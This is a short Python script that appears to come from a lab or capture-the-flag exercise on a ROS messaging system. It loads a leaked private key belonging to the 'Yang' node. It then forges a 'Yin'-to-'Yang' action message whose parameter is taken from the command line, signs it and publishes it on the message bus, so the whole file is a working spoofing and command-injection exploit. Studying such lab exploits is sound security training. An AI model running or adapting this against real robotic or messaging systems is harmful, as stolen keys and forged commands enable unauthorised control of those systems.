#!/usr/bin/python3
"""Exercise the lab ROS signature flaw with the leaked Yang private key."""
import base64
import sys
import time

import rospy
from Cryptodome.Hash import SHA256
from Cryptodome.PublicKey import RSA
from Cryptodome.Signature import PKCS1_v1_5
from yang.msg import Comms


def encoded(message):
    values = [
        message.timestamp,
        message.sender,
        message.receiver,
        str(message.action),
        str(message.actionparams),
        message.feedback,
    ]
    return ".".join(base64.urlsafe_b64encode(value.encode()).decode() for value in values)


key = RSA.import_key(open("/home/yang/yang-privkey.pem", "rb").read())
rospy.init_node("sidequest_publish", anonymous=True)
publisher = rospy.Publisher("messagebus", Comms, queue_size=10)
time.sleep(2)
message = Comms()
message.timestamp = str(rospy.get_time())
message.sender = "Yin"
message.receiver = "Yang"
message.action = 1
message.actionparams = [sys.argv[1]]
message.feedback = "ACTION"
digest = SHA256.new(encoded(message).encode())
message.hmac = base64.b64encode(PKCS1_v1_5.new(key).sign(digest)).decode()
publisher.publish(message)
time.sleep(2)
print("Message published")
